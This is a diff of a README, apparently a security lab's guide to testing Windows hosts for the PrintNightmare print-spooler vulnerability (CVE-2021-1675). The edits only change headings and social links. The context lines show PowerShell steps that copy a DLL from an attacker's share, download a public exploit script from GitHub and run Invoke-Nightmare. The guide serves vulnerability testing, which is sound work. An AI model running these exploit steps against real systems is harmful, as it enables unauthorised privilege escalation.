@@ -73,7 +73,7 @@ copy \\yourip\\kali\\nightmare.dll
 invoke-webrequest -uri "https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1" -UseBasicParsing -outfile CVE-2021-1675.ps1
 ```
 
-#### Deploy exploit
+#### Deploy Exploit
 ```powershell
 import-module .\CVE-2021-1675.ps1
 Invoke-Nightmare -DLL "C:\nightmare.dll"
@@ -81,15 +81,9 @@ Invoke-Nightmare -DLL "C:\nightmare.dll"
 ![image](https://user-images.githubusercontent.com/49488209/124728899-e2563e00-df07-11eb-9b30-96d8509caad8.png)
 
 
-### check C:\ for PrintNightmare.txt
+### Check C:\ for PrintNightmare.txt
 ![image](https://user-images.githubusercontent.com/49488209/124728938-eb470f80-df07-11eb-9acb-03bfe59a14ec.png)
 
-### It doesn't matter what it's contents is, it just maters that it exists. 
+It doesn't matter what it's contents is, it just maters that it exists. 
 
-### For any questions, comments, and criticisms, please find us on [Twitter](https://twitter.com/jumpseclabs?lang=en)
-
-
-
-
-
-Main Twitter [Twitter](https://twitter.com/jumpsec)
+### For any questions, comments, and criticisms, please find us on Twitter at [LABS](https://twitter.com/jumpseclabs?lang=en) or on [MAIN](https://twitter.com/jumpsec)
